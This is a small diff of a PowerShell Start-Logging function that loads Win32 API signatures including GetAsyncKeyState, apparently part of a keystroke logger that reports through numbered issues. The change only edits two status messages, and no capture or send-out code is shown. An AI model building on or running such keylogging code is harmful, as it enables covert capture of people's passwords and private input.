@@ -37,8 +37,8 @@ function Start-Logging
 	try 
 	{
 		$API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
-		Write-Console -Body ("Loaded the GetAysncKeyState DLL OK.") -IssueNumber $issueNumber
-		Write-Host ("DEBUG: Loaded the GetAysncKeyState DLL OK.")
+		Write-Console -Body ("Loaded the GetAysncKeyState DLL OK. Logging...") -IssueNumber $issueNumber
+		Write-Host ("DEBUG: Loaded the GetAysncKeyState DLL OK. Logging...")
 	}
 	catch 
 	{
